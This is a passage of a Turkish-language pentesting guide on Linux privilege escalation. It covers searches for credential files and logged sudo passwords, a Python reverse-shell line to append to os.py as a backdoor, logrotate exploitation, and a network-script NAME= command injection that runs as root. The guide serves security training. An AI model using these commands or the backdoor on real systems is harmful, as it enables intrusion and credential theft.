### Olağandışı Konumdaki/Sahip Olunan Dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakika içinde değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### SQLite Veritabanı Dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binary Dosyaları**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Parola içerebilen bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **parola içerebilecek birkaç olası dosyayı** arar.\
Bunu yapmak için kullanabileceğiniz **başka bir ilginç tool** ise şudur: [**LaZagne**](https://github.com/AlessandroZ/LaZagne). LaZagne, Windows, Linux ve Mac'te yerel bir bilgisayarda depolanan çok sayıda parolayı almak için kullanılan open source bir application'dır.

### Loglar

Logları okuyabiliyorsanız, **içlerinde ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar sıra dışıysa, muhtemelen o kadar ilginç olacaktır.\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logları**, bu gönderide açıklandığı üzere [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/) audit logları içine **parolaları kaydetmenize** olanak tanıyabilir.<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**logları okumak için** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **grubu** gerçekten faydalı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca **password** kelimesini **adında** veya **içeriğinde** barındıran dosyaları kontrol etmeli; logların içinde IP'leri ve e-postaları ya da hash regex'lerini de aramalısınız.\
Bunların tümünün nasıl yapılacağını burada listelemeyeceğim; ancak ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından gerçekleştirilen son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Bir python script'inin **hangi konumdan** çalıştırılacağını biliyorsanız ve o klasörün içine **yazabiliyorsanız** veya **python library'lerini değiştirebiliyorsanız**, OS library'sini değiştirip backdoor ekleyebilirsiniz (python script'inin çalıştırılacağı konuma yazabiliyorsanız os.py library'sini kopyalayıp yapıştırın).

**Library'ye backdoor eklemek** için os.py library'sinin sonuna aşağıdaki satırı ekleyin (IP ve PORT değerlerini değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` içindeki bir güvenlik açığı, bir log dosyası veya üst dizinleri üzerinde **write permissions** bulunan kullanıcıların potansiyel olarak yükseltilmiş ayrıcalıklar elde etmesine olanak tanır. Bunun nedeni, genellikle **root** olarak çalışan `logrotate`'ın, özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde arbitrary files çalıştıracak şekilde manipüle edilebilmesidir. Yalnızca _/var/log_ içindeki izinleri değil, log rotation uygulanan tüm dizinlerdeki izinleri de kontrol etmek önemlidir.

> [!TIP]
> Bu güvenlik açığı `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkiler

Güvenlik açığı hakkında daha ayrıntılı bilgiye şu sayfadan ulaşılabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile exploit edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** ile oldukça benzerdir. Bu nedenle logları değiştirebildiğinizi tespit ettiğinizde, bu logları kimin yönettiğini kontrol edin ve logları symlink'ler ile değiştirerek privilege escalation yapıp yapamayacağınızı kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine **write** edebiliyor veya mevcut bir `ifcf-<whatever>` script'ini **adjust** edebiliyorsa, **system is pwned**.<sup>[[20]](#references)</sup>

Örneğin _ifcg-eth0_ olan network scripts, network connections için kullanılır. Tam olarak .INI dosyalarına benzerler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network scripts içindeki `NAME=` attribute'u doğru şekilde işlenmiyordu. Name içinde **white/blank space** varsa sistem, **white/blank space sonrasındaki kısmı çalıştırmaya çalışır**. Bu, **ilk blank space'ten sonraki her şeyin root olarak çalıştırıldığı** anlamına gelir.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, **klasik Linux servis yönetim sistemi** olan System V init (SysVinit) için **script'leri** barındırır. Servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için script'ler içerir. Bunlar doğrudan veya `/etc/rc?.d/` içinde bulunan symbolic link'ler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d` şeklindedir.

Buna karşılık `/etc/init`, Ubuntu tarafından sunulan ve servis yönetimi görevleri için configuration file'lar kullanan daha yeni bir **service management** sistemi olan **Upstart** ile ilişkilidir. Upstart'a geçiş yapılmış olmasına rağmen SysVinit script'leri, Upstart içindeki compatibility layer sayesinde Upstart configuration'larıyla birlikte hâlâ kullanılmaktadır.

**systemd**, on-demand daemon başlatma, automount yönetimi ve system state snapshot'ları gibi gelişmiş özellikler sunan modern bir initialization ve service manager olarak ortaya çıkmıştır. Dosyaları distribution package'leri için `/usr/lib/systemd/`, administrator değişiklikleri için ise `/etc/systemd/system/` altında düzenleyerek system administration sürecini kolaylaştırır.<sup>[[21]](#references)</sup>

## Diğer Teknikler

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden kaçış


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting framework'leri: manager-channel abuse

Android rooting framework'leri, privileged kernel functionality'yi userspace manager'a açığa çıkarmak için yaygın olarak bir syscall'a hook ekler. Zayıf manager authentication (ör. FD-order tabanlı signature check'leri veya zayıf password scheme'leri), local bir app'in manager'ı taklit etmesini ve zaten rooted cihazlarda root'a yükselmesini sağlayabilir. Daha fazla bilgi ve exploitation ayrıntılarına buradan ulaşabilirsiniz:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations içindeki regex-driven service discovery, process command line'larından bir binary path'i çıkarabilir ve bunu privileged context altında `-v` ile çalıştırabilir. İzin verici pattern'ler (ör. `\S` kullanılması), writable location'larda (ör. `/tmp/httpd`) attacker tarafından staged listener'larla eşleşebilir ve root olarak execution'a yol açabilir (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Diğer discovery/monitoring stack'lerine uygulanabilecek generalized pattern'i burada öğrenebilir ve exploitation ayrıntılarını görebilirsiniz:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vector'lerini bulmak için en iyi tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'teki kernel vuln'larını enumerate eder [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla script derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation Guide](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attack and Defend: Linux Privilege Escalation Techniques of 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [No one expect command execution!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Tips and Tricks for Linux Priv Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration & Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
- [14] [What is a Socket?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Get on the D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [How to manage ACLs on Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root through network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [What is systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 and CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib docs](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet by @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Logging Passwords On Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Details Of A Logrotate Race Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
